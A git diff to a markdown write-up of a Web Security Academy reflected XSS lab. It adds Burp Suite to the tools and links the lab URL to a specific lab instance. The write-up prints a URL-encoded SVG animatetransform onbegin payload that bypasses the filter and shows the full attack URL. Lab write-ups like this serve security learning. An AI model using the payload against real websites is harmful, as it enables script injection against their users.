@@ -7,7 +7,7 @@
 - **Category:** Cross-Site Scripting (XSS)
 - **Status:** Solved
 - **Vulnerability Type:** Reflected Cross-Site Scripting
-- **Tool:** Firefox
+- **Tools:** Firefox, Burp Suite
 
 ## Objective
 
@@ -84,10 +84,10 @@ Combined the allowed SVG markup with the accepted event handler.
 %22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
 ```
 
-Visited the following URL after replacing `YOUR-LAB-ID` with the actual lab identifier:
+Visited the following URL:
 
 ```text
-https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E
+[https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E](https://0a10007b033829df80d417af00420019.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E)
 ```
 
 The browser executed the JavaScript payload, triggering the alert and solving the lab.
